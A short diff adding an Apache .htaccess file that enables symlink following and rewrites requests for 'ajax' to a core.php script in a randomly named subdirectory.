@@ -1,0 +1,3 @@
+Options +FollowSymlinks
+RewriteEngine on
+RewriteRule ^ajax$  /_/hedyrfgThFGr/core.php [L,NC,QSA]
